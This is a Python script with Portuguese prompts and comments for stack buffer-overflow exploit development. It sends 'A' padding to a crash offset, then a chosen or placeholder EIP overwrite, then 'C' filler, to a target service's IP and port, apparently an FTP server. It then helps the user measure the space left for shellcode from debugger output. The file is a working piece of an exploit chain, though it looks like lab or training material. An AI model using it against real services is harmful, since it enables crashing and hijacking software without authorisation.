#!/usr/bin/python

import argparse
import socket
import subprocess
from struct import pack
import time

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")
parser.add_argument("buffer", type=int, help="Buffer Estimado para Teste")

# Analisar os argumentos
args = parser.parse_args()


# Endereço de Memória para EIP Alvo
addressEip = str(input("Você tem o endereço de memória alvo para colocar no EIP? (s/n) ")).strip().lower()
if addressEip == "s":
    eip_int = int(input("Insira o Endereço alvo (Ex: 0x311712f3): "),16)
    eip = pack('<I', eip_int)
elif addressEip == "n":
    eip = b"B"*4
    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
buffer_size = args.buffer
payload = b"A"*offset
payload += eip
payload += b"C"*buffer_size
payload += b"\r\n" # PARA O FTPSERVER FOI NECESSÁRIO


try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP:{}  e {} 'C' [+]\n".format(str(offset), str(eip), str(buffer_size)))
    client.send(payload)
    print(payload)
    client.close()
except ConnectionResetError:
    print(f"Reset Error!")

if addressEip == "n":
    print("Conte no Debugger quantos 43 você encontra na STACK. Isso é o tamanho do buffer disponível para o payload\n")
    hexEnd = input("  Insira o número Hexadecimal da ÚLTIMA fileira que CONTÉM o número 43: ")
    hexBegin = input("  Insira o número Hexadecimal da PRIMEIRA fileira preenchida COMPLETAMENTE por 43: ")
    hexOrphans = input("  Conte e insira quantos 43 sobraram na fileira NÃO COMPLETA: ")
    print(f"\n [*] Seu espaço de Buffer para o payload é de: {int(hexEnd,16) - int(hexBegin,16) + int(hexOrphans,16)}")
